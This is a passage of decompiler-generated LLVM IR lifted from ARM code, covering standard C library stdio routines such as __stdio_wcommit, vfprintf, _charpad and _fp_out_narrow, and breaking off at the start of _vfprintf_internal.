  %v0_148f8 = load i32, i32* %r4.global-to-local, align 4
  %v1_148f8 = add i32 %v0_148f8, 32
  %storemerge.in = inttoptr i32 %v1_148f8 to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_148fc = icmp eq i32 %storemerge, 0
  br i1 %v2_148fc, label %dec_label_pc_14904, label %dec_label_pc_148e8

dec_label_pc_14904:                               ; preds = %dec_label_pc_148fc, %dec_label_pc_148d8
  %v2_14908 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_14908, i32* %r4.global-to-local, align 4
  %v1_1490c = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_1490c

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v3_148c0, { 1, 2, 3, 0 }
  uselistorder i32 %v1_14860, { 1, 0 }
  uselistorder i32 %v4_14820, { 2, 1, 0 }
  uselistorder i32 %v4_147f0, { 2, 1, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 3, 4, 5, 6, 7, 8, 10, 1, 11, 9, 12 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 3, 4, 1, 5, 6, 7 }
  uselistorder i32* %r2.global-to-local, { 4, 0, 1, 2, 3, 12, 13, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1, 10, 11, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r0.global-to-local, { 4, 0, 1, 2, 3, 9, 5, 6, 7, 8 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 6, 5, 1, 2, 3, 4, 7 }
  uselistorder label %dec_label_pc_148fc, { 1, 0 }
  uselistorder label %dec_label_pc_148e8, { 1, 0 }
  uselistorder label %.thread10, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14880, { 1, 0 }
  uselistorder label %dec_label_pc_1485c, { 1, 0 }
  uselistorder label %dec_label_pc_1483c, { 1, 0 }
}

define i32 @__stdio_wcommit() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1492c = load i32, i32* @r4, align 4
  store i32 %v3_1492c, i32* %stack_var_-8, align 4
  %v0_14930 = load i32, i32* @r0, align 4
  %v1_14930 = add i32 %v0_14930, 8
  %v2_14930 = inttoptr i32 %v1_14930 to i32*
  %v3_14930 = load i32, i32* %v2_14930, align 4
  store i32 %v3_14930, i32* @r1, align 4
  %v1_14934 = add i32 %v0_14930, 16
  %v2_14934 = inttoptr i32 %v1_14934 to i32*
  %v3_14934 = load i32, i32* %v2_14934, align 4
  %v9_14938 = icmp eq i32 %v3_14934, %v3_14930
  store i32 %v0_14930, i32* %r4.global-to-local, align 4
  br i1 %v9_14938, label %bb3, label %bb

bb:                                               ; preds = %entry
  store i32 %v3_14930, i32* %v2_14934, align 4
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v1_14944 = xor i1 %v9_14938, true
  call void @__pseudo_cond_branch(i1 %v1_14944, i32 ptrtoint (i32* @global_var_1b630.1372 to i32))
  %v0_14948 = load i32, i32* %r4.global-to-local, align 4
  %v1_14948 = add i32 %v0_14948, 8
  %v2_14948 = inttoptr i32 %v1_14948 to i32*
  %v3_14948 = load i32, i32* %v2_14948, align 4
  store i32 %v3_14948, i32* @r3, align 4
  %v1_1494c = add i32 %v0_14948, 16
  %v2_1494c = inttoptr i32 %v1_1494c to i32*
  %v3_1494c = load i32, i32* %v2_1494c, align 4
  %v2_14950 = sub i32 %v3_1494c, %v3_14948
  %v2_14954 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14954, i32* @r4, align 4
  ret i32 %v2_14950

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__GI_vfprintf() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_1495c = load i32, i32* @r4, align 4
  store i32 %v3_1495c, i32* %stack_var_-32, align 4
  %v6_1495c = load i32, i32* @r5, align 4
  %v9_1495c = load i32, i32* @r6, align 4
  %v0_14960 = load i32, i32* @r0, align 4
  %v1_14960 = add i32 %v0_14960, 52
  %v2_14960 = inttoptr i32 %v1_14960 to i32*
  %v3_14960 = load i32, i32* %v2_14960, align 4
  store i32 %v3_14960, i32* @r8, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14964 = icmp eq i32 %v3_14960, 0
  store i32 %v0_14960, i32* @r7, align 4
  %v0_1496c = load i32, i32* @r1, align 4
  store i32 %v0_1496c, i32* @sl, align 4
  %v0_14970 = load i32, i32* @r2, align 4
  store i32 %v0_14970, i32* @sb, align 4
  br i1 %v2_14964, label %dec_label_pc_14978, label %dec_label_pc_149dc

dec_label_pc_14978:                               ; preds = %entry
  %v0_14978 = call i32 @__aeabi_read_tp()
  %v0_1497c = load i32, i32* @r7, align 4
  %v1_1497c = add i32 %v0_1497c, 64
  %v2_1497c = inttoptr i32 %v1_1497c to i32*
  %v3_1497c = load i32, i32* %v2_1497c, align 4
  store i32 %v3_1497c, i32* %r3.global-to-local, align 4
  %v1_14980 = add i32 %v0_14978, -1168
  store i32 %v1_14980, i32* @r6, align 4
  %v3_14984 = icmp uge i32 %v3_1497c, %v1_14980
  store i1 %v3_14984, i1* %cpsr_c.global-to-local, align 1
  %v9_14984 = icmp eq i32 %v3_1497c, %v1_14980
  br i1 %v9_14984, label %dec_label_pc_149d0, label %dec_label_pc_1498c

dec_label_pc_1498c:                               ; preds = %dec_label_pc_14978
  %v1_1498c = add i32 %v0_1497c, 56
  store i32 %v1_1498c, i32* @r5, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v1_1498c, i32* %r2.global-to-local, align 4
  %v0_14998 = load i32, i32* @r8, align 4
  store i32 %v0_14998, i32* @r4, align 4
  %v1_1499c36 = inttoptr i32 %v1_1498c to i32*
  %v2_1499c37 = load i32, i32* %v1_1499c36, align 4
  store i32 %v2_1499c37, i32* %r3.global-to-local, align 4
  %v3_149a039 = icmp uge i32 %v2_1499c37, %v0_14998
  store i1 %v3_149a039, i1* %cpsr_c.global-to-local, align 1
  %v9_149a045 = icmp eq i32 %v2_1499c37, %v0_14998
  br i1 %v9_149a045, label %dec_label_pc_149a8, label %dec_label_pc_149c0

dec_label_pc_149a8:                               ; preds = %dec_label_pc_1498c, %dec_label_pc_149a8.dec_label_pc_1499c_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_149b8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_149b8, label %dec_label_pc_149bc, label %dec_label_pc_149a8.dec_label_pc_1499c_crit_edge

dec_label_pc_149a8.dec_label_pc_1499c_crit_edge:  ; preds = %dec_label_pc_149a8
  %v0_1499c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_149a0.pre = load i32, i32* @r4, align 4
  %v1_1499c = inttoptr i32 %v0_1499c.pre to i32*
  %v2_1499c = load i32, i32* %v1_1499c, align 4
  store i32 %v2_1499c, i32* %r3.global-to-local, align 4
  %v3_149a0 = icmp uge i32 %v2_1499c, %v1_149a0.pre
  store i1 %v3_149a0, i1* %cpsr_c.global-to-local, align 1
  %v9_149a0 = icmp eq i32 %v2_1499c, %v1_149a0.pre
  br i1 %v9_149a0, label %dec_label_pc_149a8, label %dec_label_pc_149c0

dec_label_pc_149bc:                               ; preds = %dec_label_pc_149a8
  %v0_149bc = load i32, i32* @r4, align 4
  store i32 %v0_149bc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_149c0

dec_label_pc_149c0:                               ; preds = %dec_label_pc_1498c, %dec_label_pc_149a8.dec_label_pc_1499c_crit_edge, %dec_label_pc_149bc
  %v0_149c0 = phi i32 [ %v0_149bc, %dec_label_pc_149bc ], [ %v2_1499c37, %dec_label_pc_1498c ], [ %v2_1499c, %dec_label_pc_149a8.dec_label_pc_1499c_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_149c0 = icmp eq i32 %v0_149c0, 0
  br i1 %v2_149c0, label %bb19, label %bb

bb:                                               ; preds = %dec_label_pc_149c0
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_149c0, %bb
  store i32 84428, i32* @lr, align 4
  %v1_149c8 = xor i1 %v2_149c0, true
  call void @__pseudo_cond_branch(i1 %v1_149c8, i32 ptrtoint (i32* @global_var_1907c.1373 to i32))
  %v0_149cc = load i32, i32* @r6, align 4
  %v1_149cc = load i32, i32* @r7, align 4
  %v2_149cc = add i32 %v1_149cc, 64
  %v3_149cc = inttoptr i32 %v2_149cc to i32*
  store i32 %v0_149cc, i32* %v3_149cc, align 4
  %v0_149d0.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_149d0

dec_label_pc_149d0:                               ; preds = %dec_label_pc_14978, %bb19
  %v0_149d0 = phi i32 [ %v0_1497c, %dec_label_pc_14978 ], [ %v0_149d0.pre, %bb19 ]
  %v1_149d0 = add i32 %v0_149d0, 60
  %v2_149d0 = inttoptr i32 %v1_149d0 to i32*
  %v3_149d0 = load i32, i32* %v2_149d0, align 4
  %v1_149d4 = add i32 %v3_149d0, 1
  store i32 %v1_149d4, i32* %r3.global-to-local, align 4
  store i32 %v1_149d4, i32* %v2_149d0, align 4
  %v0_149dc.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_149dc

dec_label_pc_149dc:                               ; preds = %entry, %dec_label_pc_149d0
  %v0_149ec = phi i32 [ %v0_14960, %entry ], [ %v0_149dc.pre, %dec_label_pc_149d0 ]
  %v1_149dc = inttoptr i32 %v0_149ec to i16*
  %v2_149dc = load i16, i16* %v1_149dc, align 2
  %v3_149dc = zext i16 %v2_149dc to i32
  %v1_149e0 = and i32 %v3_149dc, 192
  store i32 %v1_149e0, i32* %r3.global-to-local, align 4
  %v2_149e4 = icmp eq i32 %v1_149e0, 192
  store i1 %v2_149e4, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_149e4, label %dec_label_pc_14a04, label %dec_label_pc_149ec

dec_label_pc_149ec:                               ; preds = %dec_label_pc_149dc
  store i32 128, i32* %r1.global-to-local, align 4
  %v3_149f4 = call i32 @__stdio_trans2w_o(i16* %v1_149dc, i32 128)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_149f8 = icmp eq i32 %v3_149f4, 0
  br i1 %v2_149f8, label %dec_label_pc_149ec.dec_label_pc_14a04_crit_edge, label %dec_label_pc_14a18

dec_label_pc_149ec.dec_label_pc_14a04_crit_edge:  ; preds = %dec_label_pc_149ec
  %v0_14a0c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_14a04

dec_label_pc_14a04:                               ; preds = %dec_label_pc_149ec.dec_label_pc_14a04_crit_edge, %dec_label_pc_149dc
  %v0_14a0c = phi i32 [ %v0_14a0c.pre, %dec_label_pc_149ec.dec_label_pc_14a04_crit_edge ], [ %v0_149ec, %dec_label_pc_149dc ]
  %v0_14a04 = load i32, i32* @sl, align 4
  store i32 %v0_14a04, i32* %r1.global-to-local, align 4
  %v0_14a08 = load i32, i32* @sb, align 4
  store i32 %v0_14a08, i32* @r2, align 4
  %v2_14a10 = inttoptr i32 %v0_14a04 to i8*
  %v3_14a10 = call i32 @_vfprintf_internal(i32 %v0_14a0c, i8* %v2_14a10)
  br label %dec_label_pc_14a18

dec_label_pc_14a18:                               ; preds = %dec_label_pc_149ec, %dec_label_pc_14a04
  %storemerge = phi i32 [ %v3_14a10, %dec_label_pc_14a04 ], [ -1, %dec_label_pc_149ec ]
  store i32 %storemerge, i32* %r6.global-to-local, align 4
  %v0_14a18 = load i32, i32* @r8, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14a18 = icmp eq i32 %v0_14a18, 0
  br i1 %v2_14a18, label %dec_label_pc_14a20, label %dec_label_pc_14a94

dec_label_pc_14a20:                               ; preds = %dec_label_pc_14a18
  %v0_14a20 = load i32, i32* @r7, align 4
  %v1_14a20 = add i32 %v0_14a20, 60
  %v2_14a20 = inttoptr i32 %v1_14a20 to i32*
  %v3_14a20 = load i32, i32* %v2_14a20, align 4
  %v1_14a24 = add i32 %v3_14a20, -1
  store i32 %v1_14a24, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14a28 = icmp eq i32 %v1_14a24, 0
  store i32 %v1_14a24, i32* %v2_14a20, align 4
  br i1 %v2_14a28, label %dec_label_pc_14a34, label %dec_label_pc_14a94

dec_label_pc_14a34:                               ; preds = %dec_label_pc_14a20
  %v0_14a34 = load i32, i32* %r3.global-to-local, align 4
  %v1_14a34 = load i32, i32* @r7, align 4
  %v2_14a34 = add i32 %v1_14a34, 64
  %v3_14a34 = inttoptr i32 %v2_14a34 to i32*
  store i32 %v0_14a34, i32* %v3_14a34, align 4
  %v0_14a38 = load i32, i32* @r7, align 4
  %v1_14a38 = add i32 %v0_14a38, 56
  store i32 %v1_14a38, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14a3c

dec_label_pc_14a3c:                               ; preds = %dec_label_pc_14a6c.dec_label_pc_14a3c_crit_edge, %dec_label_pc_14a34
  %v0_14a44 = phi i32 [ %v0_14a44.pre, %dec_label_pc_14a6c.dec_label_pc_14a3c_crit_edge ], [ %v1_14a38, %dec_label_pc_14a34 ]
  %v0_14a3c = phi i32 [ %v0_14a3c.pre, %dec_label_pc_14a6c.dec_label_pc_14a3c_crit_edge ], [ %v0_14a38, %dec_label_pc_14a34 ]
  %v1_14a3c = add i32 %v0_14a3c, 56
  %v2_14a3c = inttoptr i32 %v1_14a3c to i32*
  %v3_14a3c = load i32, i32* %v2_14a3c, align 4
  store i32 %v3_14a3c, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_14a44, i32* %r2.global-to-local, align 4
  %v1_14a4824 = inttoptr i32 %v0_14a44 to i32*
  %v2_14a4825 = load i32, i32* %v1_14a4824, align 4
  store i32 %v2_14a4825, i32* %r3.global-to-local, align 4
  %v3_14a4c27 = icmp uge i32 %v2_14a4825, %v3_14a3c
  store i1 %v3_14a4c27, i1* %cpsr_c.global-to-local, align 1
  %v9_14a4c33 = icmp eq i32 %v2_14a4825, %v3_14a3c
  br i1 %v9_14a4c33, label %dec_label_pc_14a54, label %dec_label_pc_14a6c

dec_label_pc_14a54:                               ; preds = %dec_label_pc_14a3c, %dec_label_pc_14a54.dec_label_pc_14a48_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_14a64 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14a64, label %dec_label_pc_14a68, label %dec_label_pc_14a54.dec_label_pc_14a48_crit_edge

dec_label_pc_14a54.dec_label_pc_14a48_crit_edge:  ; preds = %dec_label_pc_14a54
  %v0_14a48.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_14a4c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_14a48 = inttoptr i32 %v0_14a48.pre to i32*
  %v2_14a48 = load i32, i32* %v1_14a48, align 4
  store i32 %v2_14a48, i32* %r3.global-to-local, align 4
  %v3_14a4c = icmp uge i32 %v2_14a48, %v1_14a4c.pre
  store i1 %v3_14a4c, i1* %cpsr_c.global-to-local, align 1
  %v9_14a4c = icmp eq i32 %v2_14a48, %v1_14a4c.pre
  br i1 %v9_14a4c, label %dec_label_pc_14a54, label %dec_label_pc_14a6c

dec_label_pc_14a68:                               ; preds = %dec_label_pc_14a54
  %v0_14a68 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14a68, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14a6c

dec_label_pc_14a6c:                               ; preds = %dec_label_pc_14a3c, %dec_label_pc_14a54.dec_label_pc_14a48_crit_edge, %dec_label_pc_14a68
  %v0_14a74 = phi i32 [ %v0_14a68, %dec_label_pc_14a68 ], [ %v2_14a4825, %dec_label_pc_14a3c ], [ %v2_14a48, %dec_label_pc_14a54.dec_label_pc_14a48_crit_edge ]
  %v1_14a6c = phi i32 [ %v0_14a68, %dec_label_pc_14a68 ], [ %v3_14a3c, %dec_label_pc_14a3c ], [ %v1_14a4c.pre, %dec_label_pc_14a54.dec_label_pc_14a48_crit_edge ]
  %v3_14a6c = icmp uge i32 %v0_14a74, %v1_14a6c
  store i1 %v3_14a6c, i1* %cpsr_c.global-to-local, align 1
  %v9_14a6c = icmp eq i32 %v0_14a74, %v1_14a6c
  br i1 %v9_14a6c, label %dec_label_pc_14a74, label %dec_label_pc_14a6c.dec_label_pc_14a3c_crit_edge

dec_label_pc_14a6c.dec_label_pc_14a3c_crit_edge:  ; preds = %dec_label_pc_14a6c
  %v0_14a3c.pre = load i32, i32* @r7, align 4
  %v0_14a44.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14a3c

dec_label_pc_14a74:                               ; preds = %dec_label_pc_14a6c
  %v2_14a74 = icmp ne i32 %v1_14a6c, 0
  store i1 %v2_14a74, i1* %cpsr_c.global-to-local, align 1
  %v7_14a78 = icmp slt i32 %v1_14a6c, 2
  br i1 %v7_14a78, label %dec_label_pc_14a94, label %dec_label_pc_14a7c

dec_label_pc_14a7c:                               ; preds = %dec_label_pc_14a74
  %v0_14a80 = load i32, i32* %r1.global-to-local, align 4
  %v1_14a80 = add i32 %v0_14a80, 129
  store i32 %v1_14a80, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14a94

dec_label_pc_14a94:                               ; preds = %dec_label_pc_14a20, %dec_label_pc_14a18, %dec_label_pc_14a7c, %dec_label_pc_14a74
  %v0_14a94 = load i32, i32* %r6.global-to-local, align 4
  %v2_14a98 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_14a98, i32* %r4.global-to-local, align 4
  store i32 %v6_1495c, i32* %r5.global-to-local, align 4
  store i32 %v9_1495c, i32* %r6.global-to-local, align 4
  ret i32 %v0_14a94

; uselistorder directives
  uselistorder i32 %v0_14a68, { 1, 0, 2 }
  uselistorder i32 %v1_14a4c.pre, { 0, 2, 1 }
  uselistorder i32 %v1_149a0.pre, { 1, 0 }
  uselistorder i32* %r6.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 5, 4, 0, 6, 7, 8, 9, 10, 12, 11, 1, 13 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 3, 5, 4, 0, 6, 7, 8, 9, 10, 12, 11, 1, 13, 14 }
  uselistorder i32 (i32, i8*)* @_vfprintf_internal, { 1, 0 }
  uselistorder label %dec_label_pc_14a94, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_14a6c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14a54, { 1, 0 }
  uselistorder label %dec_label_pc_14a18, { 1, 0 }
  uselistorder label %dec_label_pc_149dc, { 1, 0 }
  uselistorder label %dec_label_pc_149d0, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %dec_label_pc_149c0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_149a8, { 1, 0 }
}

define i32 @_charpad(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-25 = alloca i8, align 1
  %v3_14aa0 = load i32, i32* @r4, align 4
  %v6_14aa0 = load i32, i32* @r5, align 4
  %v9_14aa0 = load i32, i32* @r6, align 4
  %v12_14aa0 = load i32, i32* @r7, align 4
  store i8 %arg2, i8* %stack_var_-25, align 1
  %v10_14aac = ptrtoint i8* %stack_var_-25 to i32
  store i32 %v10_14aac, i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg3, i32* @r4, align 4
  %v2_14ac42 = icmp eq i32 %arg3, 0
  br i1 %v2_14ac42, label %dec_label_pc_14ae4, label %dec_label_pc_14ad8

dec_label_pc_14ac0:                               ; preds = %dec_label_pc_14ad8
  %v1_14ac0 = add i32 %v0_14ac0, -1
  store i32 %v1_14ac0, i32* @r4, align 4
  %v2_14ac4 = icmp eq i32 %v1_14ac0, 0
  %v0_14ad0 = load i32, i32* @r7, align 4
  br i1 %v2_14ac4, label %dec_label_pc_14ae4.loopexit, label %dec_label_pc_14ad8

dec_label_pc_14ad8:                               ; preds = %entry, %dec_label_pc_14ac0
  %v0_14ad04 = phi i32 [ %v0_14ad0, %dec_label_pc_14ac0 ], [ %arg1, %entry ]
  %v3_14ad8 = inttoptr i32 %v0_14ad04 to i16*
  %v4_14ad8 = call i32 @__stdio_fwrite(i32 %v10_14aac, i32 1, i16* %v3_14ad8)
  %v7_14adc = icmp eq i32 %v4_14ad8, 1
  %v0_14ac0 = load i32, i32* @r4, align 4
  br i1 %v7_14adc, label %dec_label_pc_14ac0, label %dec_label_pc_14ae4.loopexit

dec_label_pc_14ae4.loopexit:                      ; preds = %dec_label_pc_14ac0, %dec_label_pc_14ad8
  %v0_14ae4.ph = phi i32 [ %v0_14ac0, %dec_label_pc_14ad8 ], [ 0, %dec_label_pc_14ac0 ]
  %v1_14ae4.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_14ae4

dec_label_pc_14ae4:                               ; preds = %dec_label_pc_14ae4.loopexit, %entry
  %v1_14ae4 = phi i32 [ 0, %entry ], [ %v1_14ae4.pre, %dec_label_pc_14ae4.loopexit ]
  %v0_14ae4 = phi i32 [ 0, %entry ], [ %v0_14ae4.ph, %dec_label_pc_14ae4.loopexit ]
  %v2_14ae4 = sub i32 %v1_14ae4, %v0_14ae4
  store i32 %v3_14aa0, i32* @r4, align 4
  store i32 %v6_14aa0, i32* @r5, align 4
  store i32 %v9_14aa0, i32* @r6, align 4
  store i32 %v12_14aa0, i32* @r7, align 4
  ret i32 %v2_14ae4

; uselistorder directives
  uselistorder i32 %v1_14ac0, { 1, 0 }
  uselistorder label %dec_label_pc_14ae4.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_14ad8, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg4 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_14af4 = load i32, i32* @r4, align 4
  store i32 %v3_14af4, i32* %stack_var_-24, align 4
  %v6_14af4 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @r5, align 4
  %v1_14afc = and i32 %arg2, 128
  %v2_14afc = icmp eq i32 %v1_14afc, 0
  %v0_14b00 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_14b00, i32* @r8, align 4
  store i32 %arg3, i32* %r4.global-to-local, align 4
  store i32 %tmp, i32* @r7, align 4
  br i1 %v2_14afc, label %dec_label_pc_14b50thread-pre-split, label %dec_label_pc_14b14

dec_label_pc_14b14:                               ; preds = %entry
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_14b18 = call i32 @strlen(i8* %arg4)
  store i32 %v3_14b18, i32* %r0.global-to-local, align 4
  %v1_14b1c = load i32, i32* %r4.global-to-local, align 4
  %v2_14b1c = sub i32 %v1_14b1c, %v3_14b18
  store i32 %v2_14b1c, i32* @r4, align 4
  store i32 %v3_14b18, i32* @r6, align 4
  %tmp13 = icmp slt i32 %v2_14b1c, 1
  br i1 %tmp13, label %.thread, label %dec_label_pc_14b30

.thread:                                          ; preds = %dec_label_pc_14b14
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14b4c

dec_label_pc_14b30:                               ; preds = %dec_label_pc_14b14
  %v0_14b30 = load i32, i32* @r5, align 4
  %v1_14b30 = urem i32 %v0_14b30, 128
  %v0_14b34 = load i32, i32* @r8, align 4
  store i32 %v0_14b34, i32* %r0.global-to-local, align 4
  %v3_14b3c = trunc i32 %v1_14b30 to i8
  %v4_14b3c = call i32 @_charpad(i32 %v0_14b34, i8 %v3_14b3c, i32 %v2_14b1c)
  store i32 %v4_14b3c, i32* %r0.global-to-local, align 4
  %v1_14b40 = load i32, i32* @r4, align 4
  %v9_14b40 = icmp eq i32 %v4_14b3c, %v1_14b40
  store i32 %v4_14b3c, i32* %r5.global-to-local, align 4
  br i1 %v9_14b40, label %dec_label_pc_14b30.dec_label_pc_14b4c_crit_edge, label %dec_label_pc_14b6c

dec_label_pc_14b30.dec_label_pc_14b4c_crit_edge:  ; preds = %dec_label_pc_14b30
  %v0_14b4c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_14b4c

dec_label_pc_14b4c:                               ; preds = %.thread, %dec_label_pc_14b30.dec_label_pc_14b4c_crit_edge
  %v0_14b4c = phi i32 [ %v0_14b4c.pre, %dec_label_pc_14b30.dec_label_pc_14b4c_crit_edge ], [ %v3_14b18, %.thread ]
  store i32 %v0_14b4c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14b50

dec_label_pc_14b50thread-pre-split:               ; preds = %entry
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14b50

dec_label_pc_14b50:                               ; preds = %dec_label_pc_14b50thread-pre-split, %dec_label_pc_14b4c
  %v5_14b5c = phi i32 [ %arg3, %dec_label_pc_14b50thread-pre-split ], [ %v0_14b4c, %dec_label_pc_14b4c ]
  %tmp14 = icmp slt i32 %v5_14b5c, 1
  br i1 %tmp14, label %.thread5, label %bb

.thread5:                                         ; preds = %dec_label_pc_14b50
  br label %bb15

bb:                                               ; preds = %dec_label_pc_14b50
  %v5_14b58 = load i32, i32* @r7, align 4
  br label %bb15

bb15:                                             ; preds = %.thread5, %bb
  %storemerge = phi i32 [ 0, %.thread5 ], [ %v5_14b58, %bb ]
  %tmp16 = phi i1 [ false, %.thread5 ], [ true, %bb ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  call void @__pseudo_cond_branch(i1 %tmp16, i32 ptrtoint (i32* @global_var_1bb6c.1374 to i32))
  %v0_14b68 = load i32, i32* %r5.global-to-local, align 4
  %v2_14b68 = add i32 %storemerge, %v0_14b68
  store i32 %v2_14b68, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14b6c

dec_label_pc_14b6c:                               ; preds = %dec_label_pc_14b30, %bb15
  %v0_14b6c = phi i32 [ %v4_14b3c, %dec_label_pc_14b30 ], [ %v2_14b68, %bb15 ]
  store i32 %v0_14b6c, i32* %r0.global-to-local, align 4
  %v2_14b70 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_14b70, i32* %r4.global-to-local, align 4
  store i32 %v6_14af4, i32* %r5.global-to-local, align 4
  ret i32 %v0_14b6c

; uselistorder directives
  uselistorder i32 %v0_14b6c, { 1, 0 }
  uselistorder i32 %v0_14b4c, { 1, 0 }
  uselistorder i32 %v2_14b1c, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 4, 5, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 5, 4, 7, 6, 1, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_14b6c, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %dec_label_pc_14b4c, { 1, 0 }
}

define i32 @_vfprintf_internal(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp98 = call i32 @__decompiler_undefined_function_0()
  %tmp99 = call i32 @__decompiler_undefined_function_0()
  %tmp102 = call i8 @__decompiler_undefined_function_3()
  %tmp103 = call i32 @__decompiler_undefined_function_0()
  %tmp104 = call i32 @__decompiler_undefined_function_0()
  %tmp105 = call i32 @__decompiler_undefined_function_0()
  %tmp106 = call i8 @__decompiler_undefined_function_3()
  %tmp107 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %stack_var_-73 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-352 = alloca i32, align 4
  %v6_14b78 = load i32, i32* @r5, align 4
  %v9_14b78 = load i32, i32* @r6, align 4
  %v12_14b78 = load i32, i32* @r7, align 4
  %v15_14b78 = load i32, i32* @r8, align 4
  %v18_14b78 = load i32, i32* @sb, align 4
  %v21_14b78 = load i32, i32* @sl, align 4
  %v24_14b78 = load i32, i32* @fp, align 4
  %v2_14b80 = ptrtoint i32* %stack_var_-352 to i32
  store i32 %v2_14b80, i32* @r6, align 4
  store i32 %arg1, i32* @fp, align 4
  store i32 %v2_14b80, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_14b90 = load i32, i32* @r2, align 4
  store i32 %v0_14b90, i32* @r5, align 4
